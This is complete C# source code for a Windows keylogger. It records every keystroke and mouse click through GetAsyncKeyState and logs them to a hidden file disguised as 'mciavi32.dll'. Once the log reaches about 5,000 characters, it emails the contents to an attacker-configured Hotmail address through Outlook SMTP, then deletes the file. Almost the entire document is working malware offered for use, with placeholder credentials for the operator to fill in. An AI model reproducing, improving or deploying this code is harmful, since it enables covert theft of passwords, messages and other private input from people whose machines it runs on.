using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        // IMPORT
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int key);

        // CONFIGS

        public static int Counter = 0;
        public static int LogLengthLimit = 5000;
        public static bool Hidden = false;
        public static string FILE_PATH = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            + @"\mciavi32.dll";

        /////////////// HOTMAIL ACCOUNT CONFIG ///////////////
        public static string EmailFrom = "yourHOTMAIL@hotmail.com";
        public static string EmailPassword = "yourHOTMAILpassword"; //it needs to be the password of EmailFrom

        public static string EmailTo = "theirHOTMAIL@hotmail.com";
        /////////////// HOTMAIL ACCOUNT CONFIG ///////////////

        // CONFIGS
        public static void Log(string text, bool color = true)
        {
            if (Counter >= LogLengthLimit)
                SendEmail();

            if (color)
                Console.ForegroundColor = ConsoleColor.Yellow;

            Console.Write(text);

            using (StreamWriter sw = File.AppendText(FILE_PATH))
                sw.Write(text);

            if (!Hidden) {
                Hidden = true;
                File.SetAttributes(FILE_PATH, File.GetAttributes(FILE_PATH) | FileAttributes.Hidden);
            }

            Console.ResetColor();
        }

        private static void SendEmail()
        {
            var credentials = new NetworkCredential(EmailFrom, EmailPassword);

            var smtp = new SmtpClient
            {
                Host = "smtp-mail.outlook.com", //outlook smtp
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = credentials
            };

            try
            {
                var formated_date = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                var log = File.ReadAllText(FILE_PATH);
                var Message = new MailMessage(EmailFrom, EmailTo)
                {
                    Subject = $"Keylogger Report - {Environment.UserDomainName}",
                    Body = $@"
<h1>Keylogger Report</h1>
<h3>User: {Environment.UserDomainName}</h3>
<h3>Date: {formated_date}</h3>

<p>{log}</p>
",
                    IsBodyHtml = true
                };

                smtp.Send(Message);
            }
            catch (Exception ex) 
            {
                //Console.WriteLine(ex.Message);
            }

            if (File.Exists(FILE_PATH))
                File.Delete(FILE_PATH);

            Environment.Exit(1);
        }

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769 || //windows 10
                        keyState == -32767) //windows 7
                    {
                        switch (i)
                        {
                            case 1:
                                Log($" [L-CLICK] ");
                                Counter += 11;
                                break;
                            case 2:
                                Log($" [R-CLICK] ");
                                Counter += 11;
                                break;
                            case 8:
                                Log($" [BACKSPACE] ");
                                Counter += 13;
                                break;
                            case 13:
                                Log($" [ENTER] \n");
                                Counter += 10;
                                break;
                            case 16:
                                Log($" [SHIFT] ");
                                Counter += 9;
                                break;
                            case 17:
                                Log($" [CTRL] ");
                                Counter += 8;
                                break;
                            case 35:
                                Log($" [END] ");
                                Counter += 7;
                                break;
                            case 36:
                                Log($" [HOME] ");
                                Counter += 8;
                                break;
                            default:
                                Log($"{(char)i}", false);
                                Counter++;
                                break;
                        }
                    }
                }
            }
        }
    }
}
